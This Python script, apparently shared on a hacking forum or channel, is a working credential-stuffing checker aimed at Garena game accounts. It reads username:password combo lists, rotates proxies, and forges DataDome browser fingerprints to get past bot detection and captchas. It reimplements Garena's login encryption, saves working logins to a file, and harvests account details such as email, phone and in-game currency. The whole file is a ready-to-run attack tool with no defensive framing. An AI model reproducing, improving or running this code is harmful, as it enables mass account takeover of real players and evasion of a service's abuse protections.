# Share By @thaituduc TreTrau Network

import sys, json, time, hashlib, threading, argparse, queue, random, urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional, Tuple, List

try:
    from curl_cffi.requests import Session as CffiSession
except ImportError:
    print("[!] pip install curl_cffi pycryptodome")
    sys.exit(1)

from Crypto.Cipher import AES

# ── Constants ──────────────────────────────────────────────────────────────────

AUTH_BASE   = "https://auth.garena.com"
ACCOUNT_API = "https://account.garena.com"
DD_URL      = "https://dd.garena.com/js/"

APP_ID   = "100082"
REDIRECT = ("https://auth.codm.garena.com/auth/auth/callback_n"
            "?site=https://api-delete-request.codm.garena.co.id/oauth/callback/")

IMPERSONATE = "chrome131"
UA_DESKTOP  = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36")
UA_MOBILE   = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36")

REQ_TIMEOUT = 15

# Max concurrent DD cookie requests — prevents burst on dd.garena.com
DD_CONCURRENCY  = 4
# Max concurrent auth.garena.com requests — prevents IP rate-limit
AUTH_CONCURRENCY = 6

# Global semaphores — initialized in main()
_dd_sem   : Optional[threading.Semaphore] = None
_auth_sem : Optional[threading.Semaphore] = None

# Counters
_dd_total = 0
_dd_lock  = threading.Lock()

# ── DataDome fingerprint payload ──────────────────────────────────────────────

DD_JS_DATA = {
    "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
    "ua": UA_DESKTOP, "wbd": False, "dp0": True, "tagpu": 5.738121195951787,
    "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260,
    "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24,
    "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25,
    "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
    "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True,
    "plgre": True, "plgof": False, "plggt": False, "pltod": False,
    "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False,
    "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False,
    "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.",
    "bid": "NA", "mmt": "application/pdf,text/pdf",
    "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
    "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined",
    "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True,
    "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False,
    "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False,
    "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False,
    "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False,
    "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
    "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False,
    "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False,
    "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
    "so": "landscape-primary", "bda": False, "wdw": True, "prm": True,
    "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False,
    "lgs": True, "tpd": True,
}

_DD_HEADERS = {
    "accept":             "*/*",
    "accept-encoding":    "gzip, deflate, br, zstd",
    "accept-language":    "en-US,en;q=0.9",
    "cache-control":      "no-cache",
    "content-type":       "application/x-www-form-urlencoded",
    "origin":             "https://account.garena.com",
    "pragma":             "no-cache",
    "referer":            "https://account.garena.com/",
    "sec-ch-ua":          '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    "sec-ch-ua-mobile":   "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest":     "empty",
    "sec-fetch-mode":     "cors",
    "sec-fetch-site":     "same-site",
    "user-agent":         UA_DESKTOP,
}

_CID_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~_-"

def _rand_cid() -> str:
    prefix_len = random.randint(60, 72)
    suffix_len = random.randint(28, 36)
    return (
        "".join(random.choices(_CID_CHARS, k=prefix_len))
        + "~"
        + "".join(random.choices(_CID_CHARS, k=suffix_len))
    )

def _get_dd_payload() -> str:
    """Fresh payload every call — cid, ttst, tagpu are randomized."""
    js_data = dict(DD_JS_DATA)
    js_data["ttst"]  = round(random.uniform(55.0, 95.0), 6)
    js_data["tagpu"] = round(random.uniform(3.5,  8.5),  6)
    fields = {
        "jsData":        json.dumps(js_data, separators=(",", ":")),
        "eventCounters": "[]",
        "jsType":        "ch",
        "cid":           _rand_cid(),
        "ddk":           "AE3F04AD3F0D3A462481A337485081",
        "Referer":       "https://account.garena.com/",
        "request":       "/",
        "responsePage":  "origin",
        "ddv":           "4.35.4",
    }
    return "&".join(
        f"{k}={urllib.parse.quote(str(v), safe='')}" for k, v in fields.items()
    )

# ── Crypto ─────────────────────────────────────────────────────────────────────

def _parse_proxy(line: str) -> str:
    """
    Parse proxy line into authenticated URL string.
    Supports all common formats:
      ip:port
      ip:port:user:pass
      user:pass@ip:port
      http://ip:port
      http://user:pass@ip:port
      socks5://user:pass@ip:port
    """
    line = line.strip()
    if "://" in line:
        return line
    if "@" in line:
        return f"http://{line}"
    parts = line.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{line}"
    return f"http://{line}"


def encrypt_password(password: str, v1: str, v2: str) -> str:
    c   = hashlib.md5(password.encode()).hexdigest()
    h   = hashlib.sha256(
              (hashlib.sha256((c + v1).encode()).hexdigest() + v2).encode()
          ).hexdigest()
    key = bytes.fromhex(h)
    dat = bytes.fromhex(c)
    pad = 16 - len(dat) % 16
    dat += bytes([pad]) * pad
    return AES.new(key, AES.MODE_ECB).encrypt(dat).hex()[:32]

# ── DataDome: inline, rate-controlled ─────────────────────────────────────────

def get_dd_cookie(verbose: bool = False) -> Optional[str]:
    """
    Generate a fresh DD cookie with global semaphore rate control.
    Cookie is created RIGHT BEFORE use — never stale.
    """
    global _dd_total
    sem = _dd_sem or threading.Semaphore(1)
    with sem:
        try:
            sess = CffiSession(impersonate=IMPERSONATE)
            r = sess.post(DD_URL, headers=_DD_HEADERS, data=_get_dd_payload(),
                          timeout=REQ_TIMEOUT)
            if verbose:
                print(f"    [dd] {r.status_code} → {r.text[:100]}")
            if r.status_code == 200:
                j = r.json()
                if j.get("status") == 200 and "cookie" in j:
                    raw = j["cookie"].split(";")[0]
                    if "=" in raw:
                        val = raw.split("=", 1)[1].strip()
                        with _dd_lock:
                            _dd_total += 1
                        return val
        except Exception as e:
            if verbose:
                print(f"    [dd] exception: {e}")
    return None

# ── Session ────────────────────────────────────────────────────────────────────

def _new_sess(dd_cookie: str, proxy: Optional[str] = None) -> CffiSession:
    sess = CffiSession(impersonate=IMPERSONATE)
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    sess.headers.update({
        "user-agent":         UA_MOBILE,
        "accept":             "application/json, text/plain, */*",
        "accept-language":    "en-US,en;q=0.9",
        "sec-ch-ua":          '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        "sec-ch-ua-mobile":   "?1",
        "sec-ch-ua-platform": '"Android"',
    })
    sess.cookies.set("datadome", dd_cookie, domain=".garena.com", path="/")
    return sess

def _referer() -> str:
    return (f"{AUTH_BASE}/universal/oauth?all_platforms=1&response_type=token"
            f"&locale=en-SG&client_id={APP_ID}"
            f"&redirect_uri={urllib.parse.quote(REDIRECT)}")

def _auth_hdrs() -> dict:
    return {
        "host":           "auth.garena.com",
        "referer":        _referer(),
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    }

# ── Low-level API ──────────────────────────────────────────────────────────────

def _prelogin(sess: CffiSession, account: str,
              verbose: bool = False) -> Tuple[Optional[dict], str]:
    url    = f"{AUTH_BASE}/api/prelogin"
    params = {"app_id": APP_ID, "account": account, "format": "json",
              "id": str(int(time.time() * 1000))}
    sem = _auth_sem or threading.Semaphore(1)
    with sem:
        try:
            r = sess.get(url, params=params, headers=_auth_hdrs(), timeout=REQ_TIMEOUT)
            if verbose:
                print(f"    [pre] {r.status_code} → {r.text[:200]}")
            if r.status_code == 200:
                body = r.text
                if "captcha-delivery" in body or '"captcha"' in body:
                    return None, "captcha"
                data = r.json()
                if data.get("v1") and data.get("v2"):
                    new_dd = r.cookies.get("datadome")
                    if new_dd:
                        data["_new_dd"] = new_dd
                    return data, "ok"
                err = str(data.get("error", data.get("error_code", "")))
                if any(k in err for k in ("not_found", "not_exist", "no_account")):
                    return data, "not_found"
                return data, f"error:{err}"
            if r.status_code == 403:
                if "datadome" in r.text.lower() or "captcha" in r.text.lower():
                    return None, "captcha"
                return None, "blocked"
            if r.status_code == 429:
                return None, "rate_limited"
            return None, f"http_{r.status_code}"
        except Exception as e:
            return None, f"exception:{str(e)[:80]}"


def _login(sess: CffiSession, account: str, enc: str, dd2: str,
           verbose: bool = False) -> Tuple[Optional[dict], str]:
    """Login step — injects a second fresh DD cookie."""
    params = {
        "app_id":       APP_ID,
        "account":      account,
        "password":     enc,
        "redirect_uri": REDIRECT,
        "format":       "json",
        "id":           str(int(time.time() * 1000)),
    }
    url = f"{AUTH_BASE}/api/login?" + urllib.parse.urlencode(params)
    # Swap in the second fresh DD cookie for login
    sess.cookies.set("datadome", dd2, domain=".garena.com", path="/")
    sem = _auth_sem or threading.Semaphore(1)
    with sem:
        try:
            r = sess.get(url, headers=_auth_hdrs(), timeout=REQ_TIMEOUT)
            if verbose:
                print(f"    [login] {r.status_code} → {r.text[:300]}")
            if r.status_code == 200:
                body = r.text
                if "captcha-delivery" in body or '"captcha"' in body:
                    return None, "captcha"
                data = r.json()
                if data.get("session_key") or data.get("redirect_uri"):
                    sso_key = ""
                    sc = r.headers.get("set-cookie", "")
                    if "sso_key=" in sc:
                        sso_key = sc.split("sso_key=")[1].split(";")[0]
                    if not sso_key:
                        for ck in sess.cookies:
                            if getattr(ck, "name", None) == "sso_key":
                                sso_key = ck.value
                                break
                    data["_sso_key"]     = sso_key
                    data["_session_key"] = data.get("session_key", "")
                    return data, "success"
                err = str(data.get("error", data.get("error_code", "")))
                if "wrong_password" in err or "error_auth" in err:
                    return data, "wrong_pass"
                if any(k in err for k in ("not_found", "not_exist", "no_account")):
                    return data, "not_found"
                if any(k in err for k in ("ban", "suspend")):
                    return data, "banned"
                if "too_many" in err:
                    return None, "rate_limited"
                if "params" in err:
                    return data, "bad_params"
                return data, f"error:{err}"
            if r.status_code == 403:
                if "datadome" in r.text.lower() or "captcha" in r.text.lower():
                    return None, "captcha"
                return None, "blocked"
            if r.status_code == 429:
                return None, "rate_limited"
            return None, f"http_{r.status_code}"
        except Exception as e:
            return None, f"exception:{str(e)[:80]}"


def _account_info(sso_key: str, session_key: str = "",
                  verbose: bool = False) -> Optional[dict]:
    val = sso_key or session_key
    if not val:
        return None
    key = "sso_key" if sso_key else "session_key"
    try:
        sess = CffiSession(impersonate=IMPERSONATE)
        r = sess.get(
            f"{ACCOUNT_API}/api/account/init",
            headers={
                "accept":     "*/*",
                "cookie":     f"{key}={val}",
                "referer":    f"{ACCOUNT_API}/",
                "user-agent": UA_DESKTOP,
            },
            timeout=REQ_TIMEOUT,
        )
        if r.status_code == 200:
            data = r.json()
            if "error" not in data:
                return data
        if verbose:
            print(f"    [info] {r.status_code} → {r.text[:100]}")
    except Exception as e:
        if verbose:
            print(f"    [info] exception: {e}")
    return None

# ── Core pipeline ──────────────────────────────────────────────────────────────

def check_account(account: str, password: str,
                  proxy: Optional[str] = None,
                  verbose: bool = False) -> str:
    # ── Step 1: DD for prelogin ───────────────────────────────────────────────
    dd1 = get_dd_cookie(verbose=verbose)
    if not dd1:
        dd1 = get_dd_cookie(verbose=verbose)
    if not dd1:
        return "ERROR:no_dd_cookie"

    if verbose:
        print(f"    [dd1] {dd1[:20]}…")

    sess = _new_sess(dd1, proxy=proxy)

    # ── Step 2: Prelogin ──────────────────────────────────────────────────────
    pre, pst = _prelogin(sess, account, verbose=verbose)

    if pst == "captcha":
        dd1b = get_dd_cookie(verbose=verbose)
        if dd1b:
            sess = _new_sess(dd1b, proxy=proxy)
            pre, pst = _prelogin(sess, account, verbose=verbose)

    if pst == "rate_limited":
        # Short backoff then one retry
        time.sleep(1.0)
        dd1c = get_dd_cookie(verbose=verbose)
        if dd1c:
            sess = _new_sess(dd1c, proxy=proxy)
            pre, pst = _prelogin(sess, account, verbose=verbose)

    if pst != "ok":
        if pst == "not_found":        return "INVALID:account_not_found"
        if pst == "captcha":          return "ERROR:captcha"
        if pst == "blocked":          return "ERROR:blocked"
        if pst == "rate_limited":     return "ERROR:rate_limited"
        if pst.startswith("error:"):  return f"ERROR:{pst}"
        return f"ERROR:prelogin_{pst}"

    if pre.get("_new_dd"):
        sess.cookies.set("datadome", pre["_new_dd"], domain=".garena.com", path="/")

    v1  = pre["v1"]
    v2  = pre["v2"]
    enc = encrypt_password(password, v1, v2)
    if verbose:
        print(f"    [crypto] v1={v1} enc={enc[:16]}…")

    # ── Step 3: fresh DD for login ────────────────────────────────────────────
    dd2 = get_dd_cookie(verbose=verbose)
    if not dd2:
        dd2 = get_dd_cookie(verbose=verbose)
    if not dd2:
        dd2 = sess.cookies.get("datadome") or dd1  # last resort: reuse

    # ── Step 4: Login ─────────────────────────────────────────────────────────
    data, lst = _login(sess, account, enc, dd2, verbose=verbose)

    if lst == "captcha":
        dd2b = get_dd_cookie(verbose=verbose)
        if dd2b:
            data, lst = _login(sess, account, enc, dd2b, verbose=verbose)

    if lst == "rate_limited":
        time.sleep(1.0)
        dd2c = get_dd_cookie(verbose=verbose)
        if dd2c:
            data, lst = _login(sess, account, enc, dd2c, verbose=verbose)

    if lst != "success":
        if lst == "wrong_pass":    return "INVALID:wrong_password"
        if lst == "not_found":     return "INVALID:account_not_found"
        if lst == "banned":        return "INVALID:banned"
        if lst == "captcha":       return "ERROR:captcha"
        if lst == "rate_limited":  return "ERROR:rate_limited"
        if lst == "bad_params":    return "ERROR:bad_params"
        return f"ERROR:login_{lst}"

    session_key = data.get("_session_key", "")
    sso_key     = data.get("_sso_key", "")
    result = (f"SUCCESS | session_key={session_key} | sso_key={sso_key}"
              f" | redirect={data.get('redirect_uri','')[:70]}")

    # ── Step 5: Account info ──────────────────────────────────────────────────
    if session_key or sso_key:
        info = _account_info(sso_key=sso_key, session_key=session_key, verbose=verbose)
        if info:
            ui    = info.get("user_info", {})
            uname = ui.get("username", ui.get("nickname", ""))
            email = ui.get("email", "")
            ev    = "✓" if ui.get("email_v") == 1 else "✗"
            ph    = "✓" if ui.get("mobile_no") else "✗"
            fb    = "✓" if ui.get("fb_account") is not None else "✗"
            sh    = ui.get("shell", 0)
            result += (f" | user={uname} | email={email}({ev})"
                       f" | phone={ph} | fb={fb} | shells={sh}")
    return result

# ── Stats ──────────────────────────────────────────────────────────────────────

class Stats:
    def __init__(self):
        self._lock   = threading.Lock()
        self.checked = self.valid = self.invalid = self.errors = 0
        self.start   = time.time()

    def record(self, r: str):
        with self._lock:
            self.checked += 1
            if   r.startswith("SUCCESS"): self.valid   += 1
            elif r.startswith("INVALID"): self.invalid += 1
            else:                         self.errors  += 1

    def cpm(self) -> int:
        e = time.time() - self.start
        return int(self.checked / e * 60) if e > 0 else 0

    def line(self) -> str:
        ts = datetime.now().strftime("%H:%M:%S")
        return (f"\r  [{ts}]  ✓ HIT:{self.valid}  ✗ BAD:{self.invalid}"
                f"  ? ERR:{self.errors}  [{self.checked} | {self.cpm()} CPM]"
                f"  DD:{_dd_total}   ")

# ── Worker ─────────────────────────────────────────────────────────────────────

_wlock = threading.Lock()

def worker(q: queue.Queue, out_path: str, stats: Stats,
           proxies: List[str], delay: float, verbose: bool):
    proxy = random.choice(proxies) if proxies else None
    while True:
        try:
            combo = q.get_nowait()
        except queue.Empty:
            break
        if ":" not in combo:
            q.task_done()
            continue

        user, pw = combo.split(":", 1)
        result   = check_account(user.strip(), pw.strip(), proxy=proxy, verbose=verbose)
        stats.record(result)

        sys.stdout.write(stats.line())
        sys.stdout.flush()

        if result.startswith("SUCCESS"):
            combo_line = f"{user}:{pw}"
            print(f"\n  [HIT] {combo_line}")
            with _wlock:
                with open(out_path, "a", encoding="utf-8") as f:
                    f.write(f"{combo_line}\n")

        elif result.startswith("ERROR") and verbose:
            print(f"\n  [ERR] {user}:{pw} → {result}")

        q.task_done()
        if delay > 0:
            time.sleep(delay)

# ── CLI ────────────────────────────────────────────────────────────────────────

BANNER = """
GARENA DATADOME BYPASS BY THAITUDUC

# Add Proxy If Check Many Account
"""

def main():
    global _dd_sem, _auth_sem

    ap = argparse.ArgumentParser(
        description="CrossFire/Garena checker v10",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        usage="%(prog)s <combos> [proxy_file] [options]",
    )
    # ── Positional ────────────────────────────────────────────────────────────
    ap.add_argument("combos",           metavar="combos",    help="Combo file (user:pass per line)")
    ap.add_argument("proxies",          metavar="proxy_file",help="Proxy file (optional)", nargs="?", default=None)
    # ── Optional ──────────────────────────────────────────────────────────────
    ap.add_argument("-o", "--output",   metavar="FILE", default="valid.txt")
    ap.add_argument("-t", "--threads",  metavar="N",    type=int, default=6)
    ap.add_argument("-d", "--delay",    metavar="SEC",  type=float, default=0.0)
    ap.add_argument("-v", "--verbose",  action="store_true")
    args = ap.parse_args()

    print(BANNER)

    _dd_sem   = threading.Semaphore(DD_CONCURRENCY)
    _auth_sem = threading.Semaphore(AUTH_CONCURRENCY)

    # ── Load combos ───────────────────────────────────────────────────────────
    path = Path(args.combos)
    if not path.exists():
        print(f"  [!] File not found: {args.combos}"); sys.exit(1)

    combos = [c.strip() for c in path.read_text("utf-8", errors="ignore").splitlines()
              if c.strip() and ":" in c]

    # ── Load proxies (optional) ───────────────────────────────────────────────
    proxies: List[str] = []
    if args.proxies:
        pp = Path(args.proxies)
        if pp.exists():
            for ln in pp.read_text("utf-8").splitlines():
                ln = ln.strip()
                if not ln or ln.startswith("#"):
                    continue
                proxies.append(_parse_proxy(ln))

    n = min(args.threads, len(combos))
    print(f"  Combos  : {len(combos)}")
    print(f"  Threads : {n}")
    print(f"  Output  : {args.output}")
    if proxies:
        print(f"  Proxies : {len(proxies)}")
    print()

    q = queue.Queue()
    for c in combos:
        q.put(c)

    stats = Stats()
    for _ in range(n):
        threading.Thread(
            target=worker,
            args=(q, args.output, stats, proxies, args.delay, args.verbose),
            daemon=True,
        ).start()

    try:
        q.join()
    except KeyboardInterrupt:
        print("\n\n  [!] Interrupted")

    elapsed = time.time() - stats.start
    print(f"\n\n  ── Final ────────────────────────────────────")
    print(f"  Checked : {stats.checked}")
    print(f"  HIT     : {stats.valid}")
    print(f"  BAD     : {stats.invalid}")
    print(f"  ERR     : {stats.errors}")
    print(f"  Time            : {elapsed:.1f}s")
    print(f"  CPM             : {stats.cpm()}")
    print(f"  DD generated    : {_dd_total}\n")


if __name__ == "__main__":
    main()
